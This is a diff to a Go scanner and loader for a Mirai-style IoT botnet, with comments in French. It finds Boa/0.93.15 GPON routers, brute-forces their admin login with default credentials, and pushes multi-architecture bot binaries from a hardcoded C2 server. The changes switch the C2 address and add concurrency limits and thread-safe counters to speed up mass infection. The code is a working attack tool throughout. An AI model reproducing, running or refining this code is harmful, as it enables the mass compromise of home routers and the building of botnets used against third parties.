@@ -20,6 +20,10 @@ var syncWait sync.WaitGroup
 var statusLogins, statusAttempted, statusFound int
 var loginsString = []string{"adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "user:user", "admin:password", "default:default", "admin:password123"}
 
+// Sémaphore pour limiter les connexions concurrentes
+var sem = make(chan struct{}, 1000) // Limite à 1000 connexions concurrentes
+var mutex = &sync.Mutex{}
+
 func zeroByte(a []byte) {
     for i := range a {
         a[i] = 0
@@ -37,12 +41,6 @@ func sendExploit(target string) int {
 		{"bot", "/bot.mips", "mips", "mips"},
 		{"bot", "/bot.arm", "arm", "arm"},
 		{"bot", "/bot.arm7", "arm7", "arm7"},
-		{"mirai", "/mirai.mips", "mips", "telnet"},
-		{"catnet", "/catnet.mips", "mips", "scan"},
-		{"tsunami", "/tsunami.mips", "mips", "flood"},
-		{"gafgyt", "/gafgyt.mips", "mips", "ddos"},
-		{"dofloo", "/dofloo.mips", "mips", "infect"},
-		{"hajime", "/hajime.mips", "mips", "spread"},
 		{"bot", "/bot.x86", "x86", "x86"},
 		{"bot", "/bot.x86_64", "x86_64", "x86_64"},
 		{"bot", "/bot.sh4", "sh4", "sh4"},
@@ -52,7 +50,7 @@ func sendExploit(target string) int {
 	}
 
 	// Serveur C2
-	c2Server := "90.70.15.0:1337"
+	c2Server := "51.68.128.169:1337"
 
 	// Essayer chaque malware
 	for _, malware := range malwares {
@@ -156,7 +154,7 @@ func sendLogin(target string) int {
 	for x := 0; x < len(loginsString); x++ {
 		loginSplit := strings.Split(loginsString[x], ":")
 
-		conn, err := net.DialTimeout("tcp", target, 60 * time.Second)
+		conn, err := net.DialTimeout("tcp", target, 30 * time.Second) // Réduit à 30 secondes
 	    if err != nil {
 			return -1
 	    }
@@ -165,9 +163,9 @@ func sendLogin(target string) int {
 		cntLen += len(loginSplit[0])
 		cntLen += len(loginSplit[1])
 
-	    conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
+	    conn.SetWriteDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes
 	    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=" + loginSplit[0] + "&psd=" + loginSplit[1] + "\r\n\r\n"))
-		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
+		conn.SetReadDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes
 
 		bytebuf := make([]byte, 512)
 		l, err := conn.Read(bytebuf)
@@ -187,7 +185,7 @@ func sendLogin(target string) int {
 			continue
 		}
 
-		statusLogins++
+		// statusLogins est maintenant incrémenté dans processTarget
 		conn.Close()
 		break
 	}
@@ -219,7 +217,7 @@ func checkDevice(target string, timeout time.Duration) int {
 	}
 
 	if strings.Contains(string(bytebuf), "Server: Boa/0.93.15") {
-		statusFound++
+		// Ne pas incrémenter statusFound ici, c'est fait dans processTarget
 		isGpon = 1
 	}
 	zeroByte(bytebuf)
@@ -234,19 +232,36 @@ func checkDevice(target string, timeout time.Duration) int {
 }
 
 func processTarget(target string, rtarget string) {
+	// Acquérir le sémaphore
+	sem <- struct{}{}
+	defer func() {
+		// Libérer le sémaphore quand on a terminé
+		<-sem
+		syncWait.Done()
+	}()
 
-	defer syncWait.Done()
-
+	// Vérifier si l'appareil est vulnérable
 	if checkDevice(target, 10) == 1 {
-		sendLogin(target)
+		// Incrémenter le compteur de manière thread-safe
+		mutex.Lock()
+		statusFound++
+		mutex.Unlock()
+		
+		// Tenter de se connecter et d'exploiter
+		if sendLogin(target) == 1 {
+			mutex.Lock()
+			statusLogins++
+			mutex.Unlock()
+		}
 		sendExploit(target)
-		return
-	} else {
-		return
 	}
 }
 
 func main() {
+	if len(os.Args) < 2 {
+		fmt.Println("Usage: ./fiber [port]")
+		os.Exit(1)
+	}
 
 	rand.Seed(time.Now().UTC().UnixNano())
 	var i int = 0
@@ -256,15 +271,24 @@ func main() {
             time.Sleep(1 * time.Second)
             i++
         }
-    } ()
+    }()
+
+    // Initialiser le sémaphore
+    for i := 0; i < 1000; i++ {
+        sem <- struct{}{}
+        <-sem
+    }
 
     for {
         r := bufio.NewReader(os.Stdin)
         scan := bufio.NewScanner(r)
         for scan.Scan() {
-            go processTarget(scan.Text() + ":" + os.Args[1], scan.Text())
-			statusAttempted++
+            target := scan.Text()
+            mutex.Lock()
+            statusAttempted++
+            mutex.Unlock()
             syncWait.Add(1)
+            go processTarget(target + ":" + os.Args[1], target)
         }
     }
 }
